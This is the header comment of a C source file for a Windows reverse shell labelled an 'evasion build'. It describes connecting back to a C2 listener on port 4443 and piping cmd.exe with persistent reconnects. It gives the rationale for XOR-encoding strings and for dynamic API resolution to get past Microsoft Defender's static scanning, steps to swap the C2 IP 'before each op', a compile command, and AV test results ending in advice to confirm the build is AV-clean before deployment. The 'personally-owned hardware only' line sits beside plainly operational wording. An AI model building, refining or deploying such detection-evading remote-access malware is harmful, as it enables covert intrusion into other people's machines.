/*
 * vader_shell.c — Reverse Shell (Evasion Build)
 * iron-sun / 22DIV research — personally-owned hardware only
 *
 ...
 *
 * WHAT IT DOES:
 *   Connects back to a C2 listener, pipes a cmd.exe shell over TCP.
 *   On disconnect it sleeps RECONN ms then retries — persistent.
 *
 * WHY ALL STRINGS ARE XOR-ENCODED (key 0xFC):
 *   Defender's static scanner flags literal strings like "cmd.exe",
 *   "WSASocket", "CreateProcess" in PE imports/data section.
 *   XOR obfuscation moves them off the import table and out of .rdata,
 *   so static scan passes. They're decoded at runtime into stack buffers
 *   and zeroed immediately after use (sz() function).
 *
 * HOW TO UPDATE THE C2 IP BEFORE EACH OP:
 *   1. From iron-sun repo root:
 *      python shell/vader_listener.py --gen
 *      (prompts for IP, prints the new xC2[] array)
 *   2. Replace the xC2[] and xC2_LEN values below with the output.
 *   3. Recompile:
 *      gcc vader_shell.c -o vader_shell.exe -lws2_32 -lwininet \
 *        -include ws2tcpip.h -D_WIN32_WINNT=0x0600
 *
 * WHY DYNAMIC API RESOLUTION (GetProcAddress via XOR-decoded names):
 *   Static linking puts CreateProcess, WSASocket etc. into PE import table
 *   which is a primary Defender scan target. We LoadLibrary the DLLs at
 *   runtime and GetProcAddress with decoded names — zero import entries.
 *
 * AV TEST BASELINE (2026-06-25 RADON):
 *   gcc 15.2 MinGW build → 319KB → Defender CLEAN (static + behavioral).
 *   Kaspersky flags MSVC/cl.exe build only (PE header signature differs).
 *   Always verify AV-clean after recompile before deployment.
 *
 * C2 PORT: 4443 (change C2_PORT below + match vader_listener.py port)
 * ────────────────────────────────────────────────────────────────────────────
 */
